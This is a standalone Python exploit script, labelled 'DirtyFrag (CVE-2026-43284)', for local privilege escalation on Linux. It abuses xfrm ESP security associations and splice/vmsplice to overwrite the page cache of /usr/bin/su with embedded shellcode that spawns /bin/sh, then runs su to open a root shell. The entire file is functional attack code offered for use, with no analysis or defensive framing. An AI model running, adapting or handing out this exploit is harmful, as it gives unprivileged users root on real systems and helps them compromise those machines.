#!/usr/bin/env python3
import os, sys, socket, struct, fcntl, ctypes, ctypes.util, time

ENC_PORT = 4500
SEQ_VAL = 200
REPLAY_SEQ = 100
TARGET_PATH = "/usr/bin/su"
PAYLOAD_LEN = 192
PATCH_OFFSET = 0
UDP_ENCAP = 100
UDP_ENCAP_ESPINUDP = 2
SOL_UDP = 17
CLONE_NEWUSER = 0x10000000
CLONE_NEWNET = 0x40000000
SPLICE_F_MOVE = 1
SYS_unshare = 272
SYS_vmsplice = 278
SYS_splice = 275
NETLINK_XFRM = 6
XFRM_MSG_NEWSA = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4
XFRMA_ALG_AUTH_TRUNC = 20
XFRMA_ALG_CRYPT = 2
XFRMA_ENCAP = 4
XFRMA_REPLAY_ESN_VAL = 23
XFRM_MODE_TRANSPORT = 0
XFRM_STATE_ESN = 128

libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)

class iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]

def _syscall(nr, *args):
    ret = libc.syscall(nr, *args)
    if ret == -1:
        e = ctypes.get_errno()
        raise OSError(e, os.strerror(e))
    return ret

def unshare(f): return _syscall(SYS_unshare, f)
def vmsplice(fd, iov, n, fl=0): return _syscall(SYS_vmsplice, fd, ctypes.byref(iov), n, fl)
def splice(fd_in, off_in, fd_out, off_out, length, flags=0):
    return _syscall(SYS_splice, fd_in, off_in, fd_out, off_out, length, flags)

SHELL_ELF = bytes([
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
])

def rta_length(x): return ((4 + x) + 3) & ~3

def write_proc(path, data):
    with open(path, "w") as f:
        f.write(data)

def setup_userns_netns():
    real_uid = os.getuid()
    real_gid = os.getgid()
    print("[DBG] about to unshare", file=sys.stderr)
    unshare(CLONE_NEWUSER | CLONE_NEWNET)
    print("[DBG] unshare OK", file=sys.stderr)
    write_proc("/proc/self/setgroups", "deny")
    print("[DBG] setgroups deny OK", file=sys.stderr)
    write_proc("/proc/self/uid_map", f"0 {real_uid} 1\n")
    print("[DBG] uid_map OK", file=sys.stderr)
    write_proc("/proc/self/gid_map", f"0 {real_gid} 1\n")
    print("[DBG] gid_map OK", file=sys.stderr)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    print(f"[DBG] socket s fd={s.fileno()}", file=sys.stderr)
    try:
        ifr = struct.pack("<16sH", b"lo\x00", 0)
        flags = struct.unpack("<16sH", fcntl.ioctl(s, 0x8913, ifr))[1]
        print(f"[DBG] SIOCGIFFLAGS flags={flags:#x}", file=sys.stderr)
        ifr = struct.pack("<16sH", b"lo\x00", flags | 0x01 | 0x40)
        fcntl.ioctl(s, 0x8914, ifr)
        print("[DBG] SIOCSIFFLAGS OK", file=sys.stderr)
    except Exception as e:
        print(f"[DBG] lo ioctl failed: {e}", file=sys.stderr)
    finally:
        print("[DBG] closing s", file=sys.stderr)
        s.close()
        print("[DBG] s closed", file=sys.stderr)

def add_xfrm_sa(spi, patch_seqhi):
    print(f"[DBG] add_xfrm_sa spi={spi:#x}", file=sys.stderr)
    sk = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
    print(f"[DBG] netlink socket fd={sk.fileno()}", file=sys.stderr)
    sk.bind((0, 0))
    print("[DBG] netlink bind OK", file=sys.stderr)
    buf = bytearray(4096)
    offset = 16 + 224
    xs = bytearray(224)
    struct.pack_into(">I", xs, 0, 0x7f000001)
    struct.pack_into(">I", xs, 24, 0x7f000001)
    struct.pack_into(">I", xs, 56, socket.htonl(spi))
    struct.pack_into("<B", xs, 76, socket.IPPROTO_ESP)
    struct.pack_into(">I", xs, 80, 0x7f000001)
    for off in range(96, 160, 8):
        struct.pack_into("<Q", xs, off, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into("<I", xs, 204, 0)
    struct.pack_into("<I", xs, 208, 0x1234)
    struct.pack_into("<H", xs, 212, socket.AF_INET)
    struct.pack_into("<B", xs, 214, XFRM_MODE_TRANSPORT)
    struct.pack_into("<B", xs, 215, 0)
    struct.pack_into("<B", xs, 216, XFRM_STATE_ESN)
    buf[offset:offset+224] = xs
    offset += 224

    auth_data = bytearray(72+32)
    auth_data[:64] = b"hmac(sha256)\x00"
    struct.pack_into("<I", auth_data, 64, 32*8)
    struct.pack_into("<I", auth_data, 68, 128)
    auth_data[72:104] = bytes([0xAA]*32)
    alen = rta_length(len(auth_data))
    struct.pack_into("<HH", buf, offset, 4+len(auth_data), XFRMA_ALG_AUTH_TRUNC)
    buf[offset+4:offset+4+len(auth_data)] = auth_data
    offset += alen

    crypt_data = bytearray(68+16)
    crypt_data[:64] = b"cbc(aes)\x00"
    struct.pack_into("<I", crypt_data, 64, 16*8)
    crypt_data[68:84] = bytes([0xBB]*16)
    alen = rta_length(len(crypt_data))
    struct.pack_into("<HH", buf, offset, 4+len(crypt_data), XFRMA_ALG_CRYPT)
    buf[offset+4:offset+4+len(crypt_data)] = crypt_data
    offset += alen

    encap_data = bytearray(24)
    struct.pack_into("<HHH", encap_data, 0, UDP_ENCAP_ESPINUDP, socket.htons(ENC_PORT), socket.htons(ENC_PORT))
    alen = rta_length(len(encap_data))
    struct.pack_into("<HH", buf, offset, 4+len(encap_data), XFRMA_ENCAP)
    buf[offset+4:offset+4+len(encap_data)] = encap_data
    offset += alen

    esn_data = bytearray(24+4)
    struct.pack_into("<IIIIIII", esn_data, 0, 1, 0, REPLAY_SEQ, 0, patch_seqhi, 32, 0)
    alen = rta_length(len(esn_data))
    struct.pack_into("<HH", buf, offset, 4+len(esn_data), XFRMA_REPLAY_ESN_VAL)
    buf[offset+4:offset+4+len(esn_data)] = esn_data
    offset += alen

    struct.pack_into("<IHHII", buf, 0, offset, XFRM_MSG_NEWSA, NLM_F_REQUEST|NLM_F_ACK, 1, os.getpid())
    print(f"[DBG] netlink msg len={offset}, about to send", file=sys.stderr)
    sk.send(bytes(buf[:offset]))
    print("[DBG] netlink send OK", file=sys.stderr)
    rbuf = sk.recv(4096)
    print(f"[DBG] netlink recv OK len={len(rbuf)}", file=sys.stderr)
    sk.close()
    if len(rbuf) >= 16:
        rh_type = struct.unpack_from("<H", rbuf, 4)[0]
        if rh_type == 2:
            err = struct.unpack_from("<i", rbuf, 16)[0]
            if err != 0:
                raise RuntimeError(f"add_xfrm_sa failed: errno={-err}")
    return 0

def do_one_write(path, offset, spi):
    print(f"[DBG] do_one_write off={offset} spi={spi:#x}", file=sys.stderr)
    sk_recv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    print(f"[DBG] sk_recv fd={sk_recv.fileno()}", file=sys.stderr)
    sk_recv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk_recv.bind(("127.0.0.1", ENC_PORT))
    sk_recv.setsockopt(SOL_UDP, UDP_ENCAP, UDP_ENCAP_ESPINUDP)
    sk_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    print(f"[DBG] sk_send fd={sk_send.fileno()}", file=sys.stderr)
    sk_send.connect(("127.0.0.1", ENC_PORT))
    file_fd = os.open(path, os.O_RDONLY)
    print(f"[DBG] file_fd={file_fd}", file=sys.stderr)
    pfd = os.pipe()
    print(f"[DBG] pipe fds={pfd}", file=sys.stderr)
    try:
        hdr = bytearray(24)
        struct.pack_into("<I", hdr, 0, socket.htonl(spi))
        struct.pack_into("<I", hdr, 4, socket.htonl(SEQ_VAL))
        for i in range(8,24): hdr[i]=0xCC
        hdr_bytes = bytes(hdr)
        iov = iovec(ctypes.cast(ctypes.c_char_p(hdr_bytes), ctypes.c_void_p), 24)
        print("[DBG] about to vmsplice", file=sys.stderr)
        if vmsplice(pfd[1], iov, 1, 0) != 24:
            raise RuntimeError("vmsplice failed")
        print("[DBG] vmsplice OK", file=sys.stderr)
        off = ctypes.c_int64(offset)
        print("[DBG] about to splice(file->pipe)", file=sys.stderr)
        s = splice(file_fd, ctypes.byref(off), pfd[1], None, 16, SPLICE_F_MOVE)
        print(f"[DBG] splice(file->pipe) returned {s}", file=sys.stderr)
        if s != 16:
            raise RuntimeError(f"splice(file->pipe) returned {s}")
        print("[DBG] about to splice(pipe->udp)", file=sys.stderr)
        s = splice(pfd[0], None, sk_send.fileno(), None, 24+16, SPLICE_F_MOVE)
        print(f"[DBG] splice(pipe->udp) returned {s}", file=sys.stderr)
        time.sleep(0.15)
    finally:
        os.close(file_fd)
        os.close(pfd[0])
        os.close(pfd[1])
        sk_send.close()
        sk_recv.close()
    return 0

def corrupt_su():
    setup_userns_netns()
    time.sleep(0.1)
    num_chunks = PAYLOAD_LEN // 4
    print(f"[*] Installing {num_chunks} xfrm SAs...")
    for i in range(num_chunks):
        spi = 0xDEADBE10 + i
        seqhi = ((SHELL_ELF[i*4+0]<<24)|(SHELL_ELF[i*4+1]<<16)|(SHELL_ELF[i*4+2]<<8)|(SHELL_ELF[i*4+3]))
        add_xfrm_sa(spi, seqhi)
    print(f"[+] Installed {num_chunks} xfrm SAs")
    print(f"[*] Writing {PAYLOAD_LEN} bytes to {TARGET_PATH} page cache...")
    for i in range(num_chunks):
        spi = 0xDEADBE10 + i
        off = PATCH_OFFSET + i * 4
        do_one_write(TARGET_PATH, off, spi)
        if (i+1)%10==0 or (i+1)==num_chunks:
            print(f"    chunk {i+1}/{num_chunks} done")
    print(f"[+] Wrote {PAYLOAD_LEN} bytes to {TARGET_PATH}")

SU_MARKER = bytes([0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a])
ENTRY_OFFSET = 0x78

def su_already_patched():
    try:
        with open(TARGET_PATH, "rb") as f:
            f.seek(ENTRY_OFFSET)
            return f.read(8) == SU_MARKER
    except Exception:
        return False

def exec_su_login():
    for p in ["/bin/su","/usr/bin/su","/sbin/su","/usr/sbin/su"]:
        if os.path.exists(p):
            os.execl(p, "su", "-", *sys.argv[1:])
    os.execlp("su", "su", "-", *sys.argv[1:])

def main():
    if os.getuid() == 0:
        print("[+] Already root!"); os.execlp("/bin/bash", "bash")
        return
    if su_already_patched():
        print("[*] Target already patched, spawning root shell...")
        exec_su_login(); return
    print("[*] DirtyFrag (CVE-2026-43284) xfrm-ESP Exploit")
    print("[*] Target:", TARGET_PATH)
    cpid = os.fork()
    if cpid < 0:
        print("[-] fork failed"); sys.exit(1)
    if cpid == 0:
        try:
            corrupt_su()
            os._exit(0)
        except Exception as e:
            import traceback
            traceback.print_exc()
            print(f"[-] Corruption stage failed: {e}")
            os._exit(2)
    _, cstatus = os.waitpid(cpid, 0)
    if not os.WIFEXITED(cstatus) or os.WEXITSTATUS(cstatus) != 0:
        print(f"[-] Corruption child failed (status={cstatus})")
        sys.exit(1)
    if su_already_patched():
        print("[*] Page cache modified. Spawning root shell...")
        exec_su_login()
    else:
        print("[-] Verification failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
